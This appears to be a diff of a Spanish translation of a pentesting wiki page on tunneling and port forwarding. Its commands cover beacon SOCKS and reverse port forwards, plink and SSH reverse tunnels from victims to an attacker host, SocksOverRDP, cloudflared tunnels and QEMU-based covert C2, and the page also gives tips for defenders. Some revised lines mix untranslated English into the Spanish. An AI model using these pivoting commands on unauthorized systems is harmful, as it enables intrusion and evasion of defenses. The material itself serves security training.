@@ -1,4 +1,4 @@
-# Tunneling and Port Forwarding
+# Túneles y Reenvío de Puertos
 
 {{#include ../banners/hacktricks-training.md}}
 
@@ -138,7 +138,7 @@ echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
 
 ### SOCKS proxy
 
-Abre un puerto en el teamserver que escuche en todas las interfaces que se pueden usar para **rutar el tráfico a través del beacon**.
+Abre un puerto en el teamserver escuchando en todas las interfaces que se pueden usar para **rutar el tráfico a través del beacon**.
 ```bash
 beacon> socks 1080
 [+] started SOCKS4a server on: 1080
@@ -149,7 +149,7 @@ proxychains nmap -n -Pn -sT -p445,3389,5985 10.10.17.25
 ### rPort2Port
 
 > [!WARNING]
-> En este caso, el **puerto se abre en el host del beacon**, no en el Team Server y el tráfico se envía al Team Server y de allí al host:puerto indicado.
+> En este caso, el **puerto se abre en el host del beacon**, no en el Servidor del Equipo y el tráfico se envía al Servidor del Equipo y desde allí al host:puerto indicado.
 ```bash
 rportfwd [bind port] [forward host] [forward port]
 rportfwd stop [bind port]
@@ -158,7 +158,7 @@ Para tener en cuenta:
 
 - La reversa de puerto de Beacon está diseñada para **túnel tráfico al Servidor del Equipo, no para retransmitir entre máquinas individuales**.
 - El tráfico está **tuneleado dentro del tráfico C2 de Beacon**, incluyendo enlaces P2P.
-- **No se requieren privilegios de administrador** para crear reenvíos de puerto reversos en puertos altos.
+- **No se requieren privilegios de administrador** para crear reenvíos de puerto reverso en puertos altos.
 
 ### rPort2Port local
 
@@ -326,7 +326,7 @@ attacker> ssh localhost -p 2222 -l www-data -i vulnerable #Connects to the ssh o
 
 Es como una versión de consola de PuTTY (las opciones son muy similares a un cliente ssh).
 
-Dado que este binario se ejecutará en la víctima y es un cliente ssh, necesitamos abrir nuestro servicio y puerto ssh para poder tener una conexión inversa. Luego, para redirigir solo un puerto accesible localmente a un puerto en nuestra máquina:
+Como este binario se ejecutará en la víctima y es un cliente ssh, necesitamos abrir nuestro servicio y puerto ssh para poder tener una conexión inversa. Luego, para redirigir solo un puerto accesible localmente a un puerto en nuestra máquina:
 ```bash
 echo y | plink.exe -l <Our_valid_username> -pw <valid_password> [-p <port>] -R <port_ in_our_host>:<next_ip>:<final_port> <your_ip>
 echo y | plink.exe -l root -pw password [-p 2222] -R 9090:127.0.0.1:9090 10.11.0.41 #Local port 9090 to out port 9090
@@ -350,7 +350,7 @@ netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=4444
 Necesitas tener **acceso RDP sobre el sistema**.\
 Descargar:
 
-1. [SocksOverRDP x64 Binaries](https://github.com/nccgroup/SocksOverRDP/releases) - Esta herramienta utiliza `Dynamic Virtual Channels` (`DVC`) de la función de Servicio de Escritorio Remoto de Windows. DVC es responsable de **tunneling packets over the RDP connection**.
+1. [SocksOverRDP x64 Binaries](https://github.com/nccgroup/SocksOverRDP/releases) - Esta herramienta utiliza `Dynamic Virtual Channels` (`DVC`) de la función de Servicio de Escritorio Remoto de Windows. DVC es responsable de **túnel de paquetes sobre la conexión RDP**.
 2. [Proxifier Portable Binary](https://www.proxifier.com/download/#win-tab)
 
 En tu computadora cliente carga **`SocksOverRDP-Plugin.dll`** así:
@@ -358,9 +358,9 @@ En tu computadora cliente carga **`SocksOverRDP-Plugin.dll`** así:
 # Load SocksOverRDP.dll using regsvr32.exe
 C:\SocksOverRDP-x64> regsvr32.exe SocksOverRDP-Plugin.dll
 ```
-Ahora podemos **conectar** a la **víctima** a través de **RDP** usando **`mstsc.exe`**, y deberíamos recibir un **mensaje** diciendo que el **plugin SocksOverRDP está habilitado**, y escuchará en **127.0.0.1:1080**.
+Ahora podemos **connect** a la **victim** a través de **RDP** usando **`mstsc.exe`**, y deberíamos recibir un **prompt** que dice que el **SocksOverRDP plugin is enabled**, y estará **listen** en **127.0.0.1:1080**.
 
-**Conéctate** a través de **RDP** y sube y ejecuta en la máquina de la víctima el binario `SocksOverRDP-Server.exe`:
+**Connect** a través de **RDP** y sube y ejecuta en la máquina de la víctima el binario `SocksOverRDP-Server.exe`:
 ```
 C:\SocksOverRDP-x64> SocksOverRDP-Server.exe
 ```
@@ -555,7 +555,7 @@ El daemon `cloudflared` de Cloudflare puede crear túneles salientes que exponen
 cloudflared tunnel --url http://localhost:8080
 # => Generates https://<random>.trycloudflare.com that forwards to 127.0.0.1:8080
 ```
-### SOCKS5 pivot
+### Pivot de SOCKS5
 ```bash
 # Turn the tunnel into a SOCKS5 proxy on port 1080
 cloudflared tunnel --url socks5://localhost:1080 --socks5
@@ -608,7 +608,7 @@ sshTunnelGateway.bindPort = 2200   # add to frps.toml
 # On victim (OpenSSH client only)
 ssh -R :80:127.0.0.1:8080 v0@attacker_ip -p 2200 tcp --proxy_name web --remote_port 9000
 ```
-El comando anterior publica el puerto de la víctima **8080** como **attacker_ip:9000** sin desplegar ninguna herramienta adicional, lo que es ideal para pivotar viviendo de la tierra.
+El comando anterior publica el puerto de la víctima **8080** como **attacker_ip:9000** sin desplegar ninguna herramienta adicional, ideal para pivotar viviendo de la tierra.
 
 ## Túneles encubiertos basados en VM con QEMU
 
@@ -656,7 +656,7 @@ while ! ping -c1 45.77.4.101; do sleep 2; done
 • Los productos de seguridad en el host ven **tráfico de loopback benigno** (el C2 real termina dentro de la VM).  
 • Los escáneres de memoria nunca analizan el espacio del proceso malicioso porque vive en un sistema operativo diferente.
 
-### Consejos para Defender
+### Consejos para defensores
 
 • Alertar sobre **binarios inesperados de QEMU/VirtualBox/KVM** en rutas escribibles por el usuario.  
 • Bloquear conexiones salientes que se originen de `qemu-system*.exe`.  
